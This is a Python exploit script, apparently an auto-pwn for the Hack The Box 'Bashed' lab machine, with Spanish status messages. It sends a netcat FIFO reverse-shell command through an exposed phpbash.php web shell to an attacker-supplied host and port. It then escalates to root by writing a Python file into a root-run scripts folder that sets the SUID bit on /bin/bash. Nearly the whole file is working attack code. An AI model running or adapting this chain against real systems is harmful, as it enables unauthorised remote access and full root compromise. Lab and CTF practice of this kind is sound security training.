#!/usr/bin/python3
#coding:utf-8

import sys, time, threading, signal, requests, string, argparse, warnings
from pwn import *

warnings.filterwarnings("ignore")

def def_handler(sig, frame):
    print("\n[*] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

rhost="10.10.10.68"
lhost=""
lport="443"
url = "http://{}/dev/phpbash.php".format(rhost)

def makeRequest():
    p1 = log.progress("Reverse shell")
    p1.status("Generando consulta")
    time.sleep(2)
    data = {
            'cmd' : 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f'.format(lhost, lport)
            }
    p1.status("Consulta generada")
    time.sleep(2)
    try:
        r = requests.post(url, data=data, timeout=2)
    except:
        pass
    p1.success("Consulta enviada")
    time.sleep(2)

if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='Bashed Machine Hack The Box AutoPwn')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (default: 10.10.10.68)',
            default='10.10.10.68')
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    args = argparser.parse_args()

    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport

    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
    p2 = log.progress("Estado de Conexión")
    p2.status("Esperando conexión de la máquina victima")
    time.sleep(2)
    shell=listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        p2.failure("No se pudo realizar la conexión")
        time.sleep(2)
        sys.exit(1)
    else:
        p2.success("Conexión generada exitosamente")
        time.sleep(2)
    
    p3 = log.progress("Escalada de privilegios")
    p3.status("Escalando privilegios como el usuario scriptmanager")
    time.sleep(2)
    shell.sendline("sudo -u scriptmanager bash")
    p3.status("Escalando privilegios como el usuario root")
    time.sleep(2)
    shell.sendline("""echo "import os; os.system('chmod 4755 /bin/bash')" > /scripts/test.py""")
    p3.status("Esperando que se ejecute script por parte de root")
    time.sleep(60)
    shell.sendline("bash -p")
    p3.success("Accediendo como root")
    time.sleep(2)
    shell.interactive()
